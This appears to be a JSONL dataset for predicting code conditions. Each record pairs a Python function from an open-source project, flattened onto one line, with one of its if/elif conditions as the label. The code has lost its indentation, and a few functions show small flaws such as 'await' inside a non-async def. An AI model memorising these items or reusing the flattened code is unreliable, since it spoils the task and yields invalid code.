{"input": "def image_size(img_data, pure_python=False): try: if imgsize is not None: return imgsize.get_size(PeekableStringIO(img_data)) if Image is not None and not pure_python: return Image.open(cStringIO.StringIO(img_data)).size except (ValueError, imgsize.UnknownSize): pass return None", "label": "if imgsize is not None :"}
{"input": "def email_csv_query(request, query_id): if request.is_ajax(): email = request.POST.get(\"email\", None) if email: execute_query.delay(query_id, email) return HttpResponse(content={\"message\": \"message was sent successfully\"}) return HttpResponse(status=403)", "label": "if email :"}
{"input": "def _groups_args_split(self, kwargs): groups_args_split = [] groups = kwargs[\"groups\"] for key, group in groups.iteritems(): mykwargs = kwargs.copy() del mykwargs[\"groups\"] if \"group_name\" in group: mykwargs[\"source_security_group_name\"] = group[\"group_name\"] if \"user_id\" in group: mykwargs[\"source_security_group_owner_id\"] = group[\"user_id\"] if \"group_id\" in group: mykwargs[\"source_security_group_id\"] = group[\"group_id\"] groups_args_split.append(mykwargs) return groups_args_split", "label": "if \"user_id\" in group :"}
{"input": "def get_subnet_groups(self, region: str, vpc: str): try: await self._cache_subnet_groups(region) return [ subnet_group for subnet_group in self._subnet_groups_cache[region] if subnet_group[\"VpcId\"] == vpc ] except Exception as e: print_exception(f\"Failed to get RDS subnet groups: {e}\") return []", "label": "if subnet_group [ \"VpcId\" ] == vpc"}
{"input": "def on_state_update(self) -> None: if self.road: self.lane_index = self.road.network.get_closest_lane_index(self.position) self.lane = self.road.network.get_lane(self.lane_index) if self.road.record_history: self.history.appendleft(self.create_from(self))", "label": "if self . road . record_history :"}
{"input": "def delete_old_post_save( sender, instance, raw, created, update_fields, using, **kwargs ): \"\"\"Post_save on all models with file fields, deletes old files\"\"\" if raw or created: return for field_name, new_file in cache.fields_for_model_instance(instance): if update_fields is None or field_name in update_fields: old_file = cache.get_field_attr(instance, field_name) if old_file != new_file: delete_file(instance, field_name, old_file, using) # reset cache cache.make_cleanup_cache(instance)", "label": "if old_file != new_file :"}
{"input": "def i2h(self, pkt, x): if x is not None: if x < 0: warning(\"Fixed3_6: Internal value too negative: %d\" % x) x = 0 elif x > 999999999: warning(\"Fixed3_6: Internal value too positive: %d\" % x) x = 999999999 x = x * 1e-6 return x", "label": "elif x > 999999999 :"}
{"input": "def quick_main(self): if self.actions.pressed(\"cancel\"): self.previs_timer.stop() return \"main\" if self.actions.mousemove_stop: self.hovering_edge, _ = self.rfcontext.accel_nearest2D_edge( max_dist=options[\"action dist\"] ) if self.hovering_edge and not self.hovering_edge.is_valid: self.hovering_edge = None if self.hovering_edge and self.rfcontext.actions.pressed(\"quick insert\"): return self.insert_edge_loop_strip()", "label": "if self . hovering_edge and not self . hovering_edge . is_valid :"}
{"input": "def check_status(self) -> None: join_requested = False while not join_requested: status_response = self._interface.communicate_status(check_stop_req=True) if status_response and status_response.run_should_stop: # TODO(frz): This check is required # until WB-3606 is resolved on server side. if not wandb.agents.pyagent.is_running(): thread.interrupt_main() return join_requested = self._join_event.wait(self._polling_interval)", "label": "if not wandb . agents . pyagent . is_running ( ) :"}
{"input": "def listed(output, pool): for line in output.splitlines(): name, mountpoint, refquota = line.split(b\"\\t\") name = name[len(pool) + 1 :] if name: refquota = int(refquota.decode(\"ascii\")) if refquota == 0: refquota = None yield _DatasetInfo(dataset=name, mountpoint=mountpoint, refquota=refquota)", "label": "if name :"}
{"input": "def defined_properties(cls, aliases=True, properties=True, rels=True): from .relationship_manager import RelationshipDefinition props = {} for baseclass in reversed(cls.__mro__): props.update( dict( (name, property) for name, property in vars(baseclass).items() if (aliases and isinstance(property, AliasProperty)) or ( properties and isinstance(property, Property) and not isinstance(property, AliasProperty) ) or (rels and isinstance(property, RelationshipDefinition)) ) ) return props", "label": "if ( aliases and isinstance ( property , AliasProperty ) )"}
{"input": "def _mock_manager(self, *args, **kwargs): if kwargs and \"normalize\" not in kwargs: device_params = kwargs[\"device_params\"] device_handler = make_device_handler(device_params) session = SSHSession(device_handler) return Manager(session, device_handler) if args: if args[0].tag == \"request-pfe-execute\": file_name = (args[0].findtext(\"command\")).replace(\" \", \"_\") return self._read_file(file_name + \".xml\") elif args[0].tag == \"command\": file_name = (args[0].text).replace(\" \", \"_\") return self._read_file(file_name + \".xml\")", "label": "elif args [ 0 ] . tag == \"command\" :"}
{"input": "def triger_check_network(self, fail=False, force=False): time_now = time.time() if not force: if self._checking_num > 0: return if fail or self.network_stat != \"OK\": # Fail or unknown if time_now - self.last_check_time < 3: return else: if time_now - self.last_check_time < 10: return self.last_check_time = time_now threading.Thread(target=self._simple_check_worker).start()", "label": "if time_now - self . last_check_time < 10 :"}
{"input": "def delete(self): if not self.force and not self.exists(): return [] cmd = [\"delete\"] if self.filename: cmd.append(\"--filename=\" + self.filename) else: if not self.resource: self.module.fail_json(msg=\"resource required to delete without filename\") cmd.append(self.resource) if self.name: cmd.append(self.name) if self.label: cmd.append(\"--selector=\" + self.label) if self.all: cmd.append(\"--all\") if self.force: cmd.append(\"--ignore-not-found\") return self._execute(cmd)", "label": "if self . all :"}
{"input": "def load(self): \"\"\"load a custom filter\"\"\" try: if os.path.isfile(self.file): parser = make_parser() parser.setContentHandler(FilterParser(self)) with open(self.file, \"r\", encoding=\"utf8\") as the_file: parser.parse(the_file) except (IOError, OSError): print(\"IO/OSError in _filterlist.py\") except SAXParseException: print(\"Parser error\")", "label": "if os . path . isfile ( self . file ) :"}
{"input": "def exitFullscreen(self, container=None): \"\"\"turns off fullscreen mode for the specified window\"\"\" if container is None or isinstance(container, UNIVERSAL_STRING): try: container = self.widgetManager.get(WIDGET_NAMES.SubWindow, container) except: container = self._getTopLevel() if container.isFullscreen: container.isFullscreen = False container.attributes(\"-fullscreen\", False) if container.escapeBindId is not None: container.unbind(\"<Escape>\", container.escapeBindId) with PauseLogger(): self._doTitleBar() return True else: return False", "label": "if container . escapeBindId is not None :"}
{"input": "def __get__(self, instance: Any, owner: Type) -> Any: # class attribute accessed if instance is None: return self field = self.field instance_dict = instance.__dict__ to_python = self._to_python value = instance_dict[field] if self.lazy_coercion and to_python is not None: evaluated_fields: Set[str] evaluated_fields = instance.__evaluated_fields__ if field not in evaluated_fields: if value is not None or self.required: value = instance_dict[field] = to_python(value) evaluated_fields.add(field) return value", "label": "if field not in evaluated_fields :"}
{"input": "def ip_list(_): ips = [] for ip in _.split(\" \"): if not ip: continue elif isip(ip): ips.append(IP.create(ip)) else: raise TypeError(\"ip %s is invalid\" % ip) return ips", "label": "elif isip ( ip ) :"}
{"input": "def _parse_fields(line, legacy=False): \"\"\"Removes '\\n' from fields line and returns fields as a list (columns).\"\"\" line = line.rstrip(\"\\n\") if legacy: fields = line.split(\",\") else: line = line.split(\"# Fields: \")[1] fields = line.split(\", \") columns = [] for field in fields: if field not in column_converter: raise BLAST7FormatError( \"Unrecognized field (%r).\" \" Supported fields: %r\" % (field, set(column_converter.keys())) ) columns.append(column_converter[field]) return columns", "label": "if field not in column_converter :"}
{"input": "def _resolve_plugin_path(path): if not os.path.isabs(path): p = os.path.normpath(os.path.join(sublime.packages_path(), \"User\", path)) if not os.path.exists(p): p = os.path.normpath( os.path.join(sublime.packages_path(), \"LaTeXTools\", path) ) return p return path", "label": "if not os . path . exists ( p ) :"}
{"input": "def _deep_copy_dict(source, dest): for key, value in source.items(): if isinstance(value, Entity): dest[key] = {} TqApi._deep_copy_dict(value, dest[key]) else: dest[key] = value", "label": "if isinstance ( value , Entity ) :"}
{"input": "def encode(self): if not isinstance(self.expr, m2_expr.ExprInt): return False if not test_set_sf(self.parent, self.expr.size): return False value = int(self.expr) if value < 1 << self.l: self.parent.shift.value = 0 else: if value & 0xFFF: return False value >>= 12 if value >= 1 << self.l: return False self.parent.shift.value = 1 self.value = value return True", "label": "if value & 0xFFF :"}
{"input": "def test_read_audio_properties(self): mediafile = self._mediafile_fixture(\"full\") for key, value in self.audio_properties.items(): if isinstance(value, float): self.assertAlmostEqual(getattr(mediafile, key), value, delta=0.1) else: self.assertEqual(getattr(mediafile, key), value)", "label": "if isinstance ( value , float ) :"}
{"input": "def get_all_fix_names(fixer_pkg, remove_prefix=True): \"\"\"Return a sorted list of all available fix names in the given package.\"\"\" pkg = __import__(fixer_pkg, [], [], [\"*\"]) fixer_dir = os.path.dirname(pkg.__file__) fix_names = [] for name in sorted(os.listdir(fixer_dir)): if name.startswith(\"fix_\") and name.endswith(\".py\"): if remove_prefix: name = name[4:] fix_names.append(name[:-3]) return fix_names", "label": "if name . startswith ( \"fix_\" ) and name . endswith ( \".py\" ) :"}
{"input": "def _get_arg(self, f_name, args, kws, arg_no, arg_name, default=None, err_msg=None): arg = None if len(args) > arg_no: arg = args[arg_no] elif arg_name in kws: arg = kws[arg_name] if arg is None: if default is not None: return default if err_msg is None: err_msg = \"{} requires '{}' argument\".format(f_name, arg_name) raise ValueError(err_msg) return arg", "label": "if err_msg is None :"}
{"input": "def get_satellite_list(self, daemon_type=\"\"): res = {} for t in [\"arbiter\", \"scheduler\", \"poller\", \"reactionner\", \"receiver\", \"broker\"]: if daemon_type and daemon_type != t: continue satellite_list = [] res[t] = satellite_list daemon_name_attr = t + \"_name\" daemons = self.app.get_daemons(t) for dae in daemons: if hasattr(dae, daemon_name_attr): satellite_list.append(getattr(dae, daemon_name_attr)) return res", "label": "if daemon_type and daemon_type != t :"}
{"input": "def do_upload(file: Path, metadata: Metadata, repo_name=None): \"\"\"Upload a file to an index server.\"\"\" repo = get_repository(repo_name) upload_file(file, metadata, repo) if repo[\"is_warehouse\"]: domain = urlparse(repo[\"url\"]).netloc if domain.startswith(\"upload.\"): domain = domain[7:] log.info(\"Package is at https://%s/project/%s/\", domain, metadata.name) else: log.info(\"Package is at %s/%s\", repo[\"url\"], metadata.name)", "label": "if domain . startswith ( \"upload.\" ) :"}
{"input": "def __next__(self): for res in self._execution_context: for item in res: for operator in self._local_aggregators: if isinstance(item, dict) and item: operator.aggregate(item[\"item\"]) elif isinstance(item, numbers.Number): operator.aggregate(item) if self._results is None: self._results = [] for operator in self._local_aggregators: self._results.append(operator.get_result()) if self._result_index < len(self._results): res = self._results[self._result_index] self._result_index += 1 return res raise StopIteration", "label": "elif isinstance ( item , numbers . Number ) :"}
{"input": "def __iter__(self): yield pd.Timestamp.utcnow(), SESSION_START while True: current_time = pd.Timestamp.utcnow() current_minute = current_time.floor(\"1 min\") if self.end is not None and current_minute >= self.end: break if self._last_emit is None or current_minute > self._last_emit: log.debug(\"emitting minutely bar: {}\".format(current_minute)) self._last_emit = current_minute yield current_minute, BAR else: sleep(1) yield current_minute, SESSION_END", "label": "if self . end is not None and current_minute >= self . end :"}
{"input": "def _escape_attrib(text): # escape attribute value try: if \"&\" in text: text = text.replace(\"&\", \"&amp;\") if \"<\" in text: text = text.replace(\"<\", \"&lt;\") if \">\" in text: text = text.replace(\">\", \"&gt;\") if '\"' in text: text = text.replace('\"', \"&quot;\") if \"\\n\" in text: text = text.replace(\"\\n\", \"&#10;\") return text except (TypeError, AttributeError): # pragma: no cover _raise_serialization_error(text)", "label": "if \"&\" in text :"}
{"input": "def _read_row_from_packet(self, packet): row = [] for encoding, converter in self.converters: try: data = packet.read_length_coded_string() except IndexError: # No more columns in this row # See https://github.com/PyMySQL/PyMySQL/pull/434 break if data is not None: if encoding is not None: data = data.decode(encoding) if DEBUG: print(\"DEBUG: DATA = \", data) if converter is not None: data = converter(data) row.append(data) return tuple(row)", "label": "if converter is not None :"}
{"input": "def dumpMenuTree(self, aList, level=0, path=\"\"): for z in aList: kind, val, val2 = z if kind == \"@item\": name = self.getName(val, val2) g.es_print( \"%s %s (%s) [%s]\" % (\" \" * (level + 0), val, val2, path + \"/\" + name) ) else: name = self.getName(kind.replace(\"@menu \", \"\")) g.es_print(\"%s %s... [%s]\" % (\" \" * (level), kind, path + \"/\" + name)) self.dumpMenuTree(val, level + 1, path=path + \"/\" + name)", "label": "if kind == \"@item\" :"}
{"input": "def startElement(self, name, attrs, connection): if name == \"SecurityGroups\": return self.security_groups elif name == \"ClassicLinkVPCSecurityGroups\": return self.classic_link_vpc_security_groups elif name == \"BlockDeviceMappings\": if self.use_block_device_types: self.block_device_mappings = BDM() else: self.block_device_mappings = ResultSet([(\"member\", BlockDeviceMapping)]) return self.block_device_mappings elif name == \"InstanceMonitoring\": self.instance_monitoring = InstanceMonitoring(self) return self.instance_monitoring", "label": "if self . use_block_device_types :"}
{"input": "def __get_dev_and_disk(topology): rv = [] for values in topology.values(): values = values.copy() while values: value = values.pop() if value[\"type\"] == \"DISK\": rv.append((value[\"path\"].replace(\"/dev/\", \"\"), value[\"disk\"])) values += value.get(\"children\") or [] return rv", "label": "if value [ \"type\" ] == \"DISK\" :"}
{"input": "def _process_events(self, event_list): for key, mask in event_list: fileobj, (reader, writer) = key.fileobj, key.data if mask & selectors.EVENT_READ and reader is not None: if reader._cancelled: self.remove_reader(fileobj) else: self._add_callback(reader) if mask & selectors.EVENT_WRITE and writer is not None: if writer._cancelled: self.remove_writer(fileobj) else: self._add_callback(writer)", "label": "if reader . _cancelled :"}
{"input": "def colourLabels(self): if self.showAttr and self.hasAttr: self.canvas.itemconfigure(self.attrId, fill=self.fgColour) try: if not self.selected: self.label.config(background=self.bgColour, fg=self.fgColour) else: self.label.config(background=self.bgHColour, fg=self.fgHColour) except: pass", "label": "if not self . selected :"}
{"input": "def validate_char_lengths(self): for field in self._meta.get_fields(): if not field.is_relation and field.get_internal_type() == \"CharField\": if ( isinstance(getattr(self, field.name), basestring) and len(getattr(self, field.name)) > field.max_length ): raise Exception( \"Role %s value exceeeds max length of %s.\" % (field.name, field.max_length) )", "label": "if not field . is_relation and field . get_internal_type ( ) == \"CharField\" :"}
{"input": "def _render_lang_List(self, element): with self.buffer.foldable_lines(): self.buffer.write(\"[\", style=self.styles.bracket) item_count = len(element.items) if item_count: with self.buffer.indent(): for idx, item in enumerate(element.items): self._render(item) if idx < (item_count - 1): self.buffer.write(\",\") self.buffer.mark_line_break() if element.trimmed: self.buffer.write(\"...\") self.buffer.write(\"]\", style=self.styles.bracket)", "label": "if item_count :"}
{"input": "def do_dialog(): \"\"\"Post dialog and handle user interaction until quit\"\"\" my_dlg = Dlg.GetNewDialog(ID_MAIN, -1) while 1: n = Dlg.ModalDialog(None) if n == ITEM_LOOKUP_BUTTON: tp, h, rect = my_dlg.GetDialogItem(ITEM_LOOKUP_ENTRY) txt = Dlg.GetDialogItemText(h) tp, h, rect = my_dlg.GetDialogItem(ITEM_RESULT) Dlg.SetDialogItemText(h, dnslookup(txt)) elif n == ITEM_QUIT_BUTTON: break", "label": "elif n == ITEM_QUIT_BUTTON :"}
{"input": "def _extract_more_comments(tree): \"\"\"Return a list of MoreComments objects removed from tree.\"\"\" more_comments = [] queue = [(None, x) for x in tree] while len(queue) > 0: parent, comm = queue.pop(0) if isinstance(comm, MoreComments): heappush(more_comments, comm) if parent: parent.replies.remove(comm) else: tree.remove(comm) else: for item in comm.replies: queue.append((comm, item)) return more_comments", "label": "if isinstance ( comm , MoreComments ) :"}
{"input": "def run(self): while True: self.finished.wait(self.interval) if self.finished.isSet(): return try: self.function(*self.args, **self.kwargs) except Exception: if self.bus: self.bus.log( \"Error in perpetual timer thread function %r.\" % self.function, level=40, traceback=True, ) # Quit on first error to avoid massive logs. raise", "label": "if self . finished . isSet ( ) :"}
{"input": "def emit_classattribs(self, typebld): if hasattr(self, \"_clrclassattribs\"): for attrib_info in self._clrclassattribs: if isinstance(attrib_info, type): ci = clr.GetClrType(attrib_info).GetConstructor(()) cab = CustomAttributeBuilder(ci, ()) elif isinstance(attrib_info, CustomAttributeDecorator): cab = attrib_info.GetBuilder() else: make_decorator = attrib_info() cab = make_decorator.GetBuilder() typebld.SetCustomAttribute(cab)", "label": "if isinstance ( attrib_info , type ) :"}
{"input": "def wrapper(fn): if debug_run_test_calls: ret = str(fn(*args, *kwargs)) print(\"TEST: %s()\" % fn.__name__) if args: print(\" arg:\", args) if kwargs: print(\" kwa:\", kwargs) print(\" ret:\", ret) return fn", "label": "if kwargs :"}
{"input": "def _prune(self): with self.lock: entries = self._list_dir() if len(entries) > self._threshold: now = time.time() try: for i, fpath in enumerate(entries): remove = False f = LockedFile(fpath, \"rb\") exp = pickle.load(f.file) f.close() remove = exp <= now or i % 3 == 0 if remove: self._del_file(fpath) except Exception: pass", "label": "if len ( entries ) > self . _threshold :"}
{"input": "def delete_if_forked(ghrequest): FORKED = False query = \"/user/repos\" r = utils.query_request(query) for repo in r.json(): if repo[\"description\"]: if ghrequest.target_repo_fullname in repo[\"description\"]: FORKED = True url = f\"/repos/{repo['full_name']}\" utils.query_request(url, method=\"DELETE\") return FORKED", "label": "if repo [ \"description\" ] :"}
{"input": "def _feed_data_to_buffered_proto(proto, data): data_len = len(data) while data_len: buf = proto.get_buffer(data_len) buf_len = len(buf) if not buf_len: raise RuntimeError(\"get_buffer() returned an empty buffer\") if buf_len >= data_len: buf[:data_len] = data proto.buffer_updated(data_len) return else: buf[:buf_len] = data[:buf_len] proto.buffer_updated(buf_len) data = data[buf_len:] data_len = len(data)", "label": "if not buf_len :"}
{"input": "def _plugin_get_requirements(self, requirements_iter): plugin_requirements = {\"platform\": [], \"python\": [], \"network\": [], \"native\": []} # parse requirements for requirement in requirements_iter: key = requirement[0] values = requirement[1] if isinstance(values, str) or isinstance(values, bool): values = [values] if key in plugin_requirements: plugin_requirements[key].extend(values) else: warning(\"{}={}: No supported requirement\".format(key, values)) return plugin_requirements", "label": "if key in plugin_requirements :"}
{"input": "def setCurrentModelIndexes(self, indexes): self._indexes = [] self._index = None for i in indexes: if i.isValid(): if i.column() != self._column: i = i.sibling(i.row(), self._column) self._indexes.append(i) self.updateItems() self.updateSelectedItem()", "label": "if i . column ( ) != self . _column :"}
{"input": "def _publish(self, data): retry = True while True: try: if not retry: self._redis_connect() return self.redis.publish(self.channel, pickle.dumps(data)) except redis.exceptions.ConnectionError: if retry: logger.error(\"Cannot publish to redis... retrying\") retry = False else: logger.error(\"Cannot publish to redis... giving up\") break", "label": "if not retry :"}
{"input": "def write_pad_and_flush(self, data, pad=\" \"): if self.encryptor and (data or self.encode_buffer): if self.encode_batches: remainder = len(self.encode_buffer) + len(data) remainder %= self.encode_batches padding = self.encode_batches - remainder data += pad * padding self.write(data) self.flush()", "label": "if self . encode_batches :"}
{"input": "def dump_metrics(self): metrics = self._registry.dump_metrics() # Filter out min and max if there have been no samples. for metric in metrics.itervalues(): if metric.get(\"count\") == 0: if \"min\" in metric: metric[\"min\"] = 0.0 if \"max\" in metric: metric[\"max\"] = 0.0 return metrics", "label": "if metric . get ( \"count\" ) == 0 :"}
{"input": "def demo(): d = StatusProgressDialog(\"A Demo\", \"Doing something...\") import win32api for i in range(100): if i == 50: d.SetText(\"Getting there...\") if i == 90: d.SetText(\"Nearly done...\") win32api.Sleep(20) d.Tick() d.Close()", "label": "if i == 90 :"}
{"input": "def get_file_contents(app_name: str, app_version: str, file_path: str): full_path = f\"{app_name}/{app_version}/{file_path}\" success, contents = await MinioApi.get_file(app_name, app_version, file_path) if success: return contents else: if contents is None: raise DoesNotExistException(\"read\", \"file\", full_path) else: raise InvalidInputException( \"read\", \"file\", full_path, errors={\"error\": contents} )", "label": "if contents is None :"}
{"input": "def _sashMark(self, event): self._sashIndex = -1 try: self._sashIndex, which = self.paneframe.identify(event.x, event.y) if which == \"sash\": self._sashx = [ self.paneframe.sash_coord(i)[0] for i in range(len(self._lists) - 1) ] self._sashdx = self._sashx[self._sashIndex] - event.x self._sashDrag(event) else: self._sashIndex = -1 except: return return \"break\"", "label": "if which == \"sash\" :"}
{"input": "def emptyTree(self): for child in self: childObj = child.getObject() del childObj[NameObject(\"/Parent\")] if NameObject(\"/Next\") in childObj: del childObj[NameObject(\"/Next\")] if NameObject(\"/Prev\") in childObj: del childObj[NameObject(\"/Prev\")] if NameObject(\"/Count\") in self: del self[NameObject(\"/Count\")] if NameObject(\"/First\") in self: del self[NameObject(\"/First\")] if NameObject(\"/Last\") in self: del self[NameObject(\"/Last\")]", "label": "if NameObject ( \"/Next\" ) in childObj :"}
{"input": "def contractIfNotCurrent(c, p, leaveOpen): if p == leaveOpen or not p.isAncestorOf(leaveOpen): p.contract() for child in p.children(): if child != leaveOpen and child.isAncestorOf(leaveOpen): contractIfNotCurrent(c, child, leaveOpen) else: for p2 in child.self_and_subtree(): p2.contract()", "label": "if child != leaveOpen and child . isAncestorOf ( leaveOpen ) :"}
{"input": "def test_cat(shape, cat_dim, split, dim): assert sum(split) == shape[cat_dim] gaussian = random_gaussian(shape, dim) parts = [] end = 0 for size in split: beg, end = end, end + size if cat_dim == -1: part = gaussian[..., beg:end] elif cat_dim == -2: part = gaussian[..., beg:end, :] elif cat_dim == 1: part = gaussian[:, beg:end] else: raise ValueError parts.append(part) actual = Gaussian.cat(parts, cat_dim) assert_close_gaussian(actual, gaussian)", "label": "elif cat_dim == 1 :"}
{"input": "def _remove_timeout(self, key): if key in self.waiting: request, callback, timeout_handle = self.waiting[key] if timeout_handle is not None: self.io_loop.remove_timeout(timeout_handle) del self.waiting[key]", "label": "if timeout_handle is not None :"}
{"input": "def gyro(self, mapper, *pyr): for i in (0, 1, 2): axis = self.axes[i] # 'gyro' cannot map to mouse, but 'mouse' does that. if axis in Axes or type(axis) == int: mapper.gamepad.axisEvent( axis, AxisAction.clamp_axis(axis, pyr[i] * self.speed[i] * -10) ) mapper.syn_list.add(mapper.gamepad)", "label": "if axis in Axes or type ( axis ) == int :"}
{"input": "def check_enums_ATLAS_MACHTYPE(lines): for i, mach_type in enumerate(ATLAS_MACHTYPE): got = lines.pop(0).strip() expect = \"{0} = '{1}'\".format(i, mach_type) if got != expect: raise RuntimeError( \"ATLAS_MACHTYPE mismatch at position \" + str(i) + \": got >>\" + got + \"<<, expected >>\" + expect + \"<<\" )", "label": "if got != expect :"}
{"input": "def readArgs(self, node): res = {} for c in self.getChildrenOf(node): val = c.getAttribute(\"val\") if val in self.modules: res[str(c.nodeName)] = self.modules[val] elif val in self.mothers: res[str(c.nodeName)] = self.mothers[val] elif val != \"\": res[str(c.nodeName)] = eval(val) return res", "label": "elif val in self . mothers :"}
{"input": "def submit_events(self, events): headers = {\"Content-Type\": \"application/json\"} event_chunk_size = self.event_chunk_size for chunk in chunks(events, event_chunk_size): payload = { \"apiKey\": self.api_key, \"events\": {\"api\": chunk}, \"uuid\": get_uuid(), \"internalHostname\": get_hostname(), } params = {} if self.api_key: params[\"api_key\"] = self.api_key url = \"%s/intake?%s\" % (self.api_host, urlencode(params)) self.submit_http(url, json.dumps(payload), headers)", "label": "if self . api_key :"}
{"input": "def rewrite_urls_mygpo(self): # Check if we have to rewrite URLs since the last add rewritten_urls = self.mygpo_client.get_rewritten_urls() changed = False for rewritten_url in rewritten_urls: if not rewritten_url.new_url: continue for channel in self.channels: if channel.url == rewritten_url.old_url: logger.info(\"Updating URL of %s to %s\", channel, rewritten_url.new_url) channel.url = rewritten_url.new_url channel.save() changed = True break if changed: util.idle_add(self.update_episode_list_model)", "label": "if not rewritten_url . new_url :"}
{"input": "def validate_hostname(hostname): if hostname is None or len(hostname) == 0: return False, \"Empty hostname or domain is not allowed\" fields = hostname.split(\".\") for field in fields: if not field: return False, \"Empty hostname or domain is not allowed\" if field[0] == \"-\" or field[-1] == \"-\": return False, \"Hostname or domain should not start or end with '-'\" machinename = fields[0] if len(machinename) > 64 or not machinename[0].isalpha(): return False, \"Hostname should start with alpha char and <= 64 chars\" return True, None", "label": "if field [ 0 ] == \"-\" or field [ - 1 ] == \"-\" :"}
{"input": "def apply_to(cls, lexer): # Apply a font for all styles lexer.setFont(Font().load()) for name, font in cls.__dict__.items(): if not isinstance(font, Font): continue if hasattr(lexer, name): style_num = getattr(lexer, name) lexer.setColor(QColor(font.color), style_num) lexer.setEolFill(True, style_num) lexer.setPaper(QColor(font.paper), style_num) lexer.setFont(font.load(), style_num)", "label": "if not isinstance ( font , Font ) :"}
{"input": "def dr_relation(self, C, trans, nullable): state, N = trans terms = [] g = self.lr0_goto(C[state], N) for p in g: if p.lr_index < p.len - 1: a = p.prod[p.lr_index + 1] if a in self.grammar.Terminals: if a not in terms: terms.append(a) # This extra bit is to handle the start state if state == 0 and N == self.grammar.Productions[0].prod[0]: terms.append(\"$end\") return terms", "label": "if a in self . grammar . Terminals :"}
{"input": "def process_module(name, module, parent): if parent: modules[parent][\"items\"].append(name) mg = module_groups.setdefault(name, []) mg.append(parent) if get_module_type(name) == \"py3status\": module[\".group\"] = parent # check module content for k, v in list(module.items()): if k.startswith(\"on_click\"): # on_click event process_onclick(k, v, name) # on_click should not be passed to the module via the config. del module[k] if isinstance(v, ModuleDefinition): # we are a container module[\"items\"] = [] return module", "label": "if get_module_type ( name ) == \"py3status\" :"}
{"input": "def GetQualifiedWsdlName(type): with _lazyLock: wsdlNSAndName = _wsdlNameMap.get(type) if wsdlNSAndName: return wsdlNSAndName else: if issubclass(type, list): ns = GetWsdlNamespace(type.Item._version) return (ns, \"ArrayOf\" + Capitalize(type.Item._wsdlName)) else: ns = GetWsdlNamespace(type._version) return (ns, type._wsdlName)", "label": "if wsdlNSAndName :"}
{"input": "def assert_tensors_equal(sess, t1, t2, n): \"\"\"Compute tensors `n` times and ensure that they are equal.\"\"\" for _ in range(n): v1, v2 = sess.run([t1, t2]) if v1.shape != v2.shape: return False if not np.all(v1 == v2): return False return True", "label": "if v1 . shape != v2 . shape :"}
{"input": "def _lxml_default_loader(href, parse, encoding=None, parser=None): if parse == \"xml\": data = etree.parse(href, parser).getroot() else: if \"://\" in href: f = urlopen(href) else: f = open(href, \"rb\") data = f.read() f.close() if not encoding: encoding = \"utf-8\" data = data.decode(encoding) return data", "label": "if not encoding :"}
{"input": "def range_f(begin, end, step): # like range, but works on non-integer too seq = [] while True: if step > 0 and begin > end: break if step < 0 and begin < end: break seq.append(begin) begin = begin + step return seq", "label": "if step > 0 and begin > end :"}
{"input": "def _get_seccomp_whitelist(self): whitelist = [False] * MAX_SYSCALL_NUMBER index = _SYSCALL_INDICIES[NATIVE_ABI] for i in range(SYSCALL_COUNT): # Ensure at least one syscall traps. # Otherwise, a simple assembly program could terminate without ever trapping. if i in (sys_exit, sys_exit_group): continue handler = self._security.get(i, DISALLOW) for call in translator[i][index]: if call is None: continue if isinstance(handler, int): whitelist[call] = handler == ALLOW return whitelist", "label": "if i in ( sys_exit , sys_exit_group ) :"}
{"input": "def add_custom_versions(versions): \"\"\"create custom versions strings\"\"\" versions_dict = {} for tech, version in versions.items(): # clean up \"-\" from version if \"-\" in version: version = version.split(\"-\")[0] if version.startswith(\"v\"): version = version[1:] # Remove the 'v' prefix versions_dict[tech + \"_numeric\"] = version.split(\"+\")[0] # \"3.3.0.33\" is what we have, we want \"3.3\" versions_dict[tech + \"_short\"] = \"{}.{}\".format(*version.split(\".\")) return versions_dict", "label": "if version . startswith ( \"v\" ) :"}
{"input": "def detab(self, text): \"\"\"Remove a tab from the front of each line of the given text.\"\"\" newtext = [] lines = text.split(\"\\n\") for line in lines: if line.startswith(\" \" * self.tab_length): newtext.append(line[self.tab_length :]) elif not line.strip(): newtext.append(\"\") else: break return \"\\n\".join(newtext), \"\\n\".join(lines[len(newtext) :])", "label": "if line . startswith ( \" \" * self . tab_length ) :"}
{"input": "def ignore_module(module): result = False for check in ignore_these: if \"/*\" in check: if check[:-1] in module: result = True else: if (os.getcwd() + \"/\" + check + \".py\") == module: result = True if result: print_warning(\"Ignoring module: \" + module) return result", "label": "if check [ : - 1 ] in module :"}
{"input": "def load_previous_values(self): ReportOptions.load_previous_values(self) # Pass the loaded values to the menu options so they will be displayed # properly. for optname in self.options_dict: menu_option = self.menu.get_option_by_name(optname) if menu_option: menu_option.set_value(self.options_dict[optname])", "label": "if menu_option :"}
{"input": "def dequeue(self): with self.db(commit=True) as curs: curs.execute( \"select id, data from task where queue = ? \" \"order by priority desc, id limit 1\", (self.name,), ) result = curs.fetchone() if result is not None: tid, data = result curs.execute(\"delete from task where id = ?\", (tid,)) if curs.rowcount == 1: return to_bytes(data)", "label": "if result is not None :"}
{"input": "def _collect_sublayers_attr(self, attr): if attr not in [\"trainable_weights\", \"nontrainable_weights\"]: raise ValueError( \"Only support to collect some certain attributes of nested layers,\" \"e.g. 'trainable_weights', 'nontrainable_weights', but got {}\".format(attr) ) if self._layers is None: return [] nested = [] for layer in self._layers: value = getattr(layer, attr) if value is not None: nested.extend(value) return nested", "label": "if value is not None :"}
{"input": "def DeleteTab(self, tab): tab_renderer = self.tabs[tab] was_selected = tab_renderer.GetSelected() self.tabs.remove(tab_renderer) if tab_renderer: del tab_renderer # determine our new selection if was_selected and self.GetTabsCount() > 0: if tab > self.GetTabsCount() - 1: self.tabs[self.GetTabsCount() - 1].SetSelected(True) else: self.tabs[tab].SetSelected(True) self.AdjustTabsSize() self.Refresh()", "label": "if tab > self . GetTabsCount ( ) - 1 :"}
{"input": "def _show_warnings(self): if self._warnings_handled: return self._warnings_handled = True if self._result and (self._result.has_next or not self._result.warning_count): return ws = self._get_db().show_warnings() if ws is None: return for w in ws: msg = w[-1] if PY2: if isinstance(msg, unicode): msg = msg.encode(\"utf-8\", \"replace\") warnings.warn(err.Warning(*w[1:3]), stacklevel=4)", "label": "if PY2 :"}
{"input": "def fetch(): retval = {} content = retrieve_content(__url__) if __check__ not in content: content = retrieve_content(__backup__) if __check__ in content: for line in content.split(\"\\n\"): line = line.strip() if not line or line.startswith(\"#\") or \".\" not in line: continue retval[line] = (__info__, __reference__) return retval", "label": "if not line or line . startswith ( \"#\" ) or \".\" not in line :"}
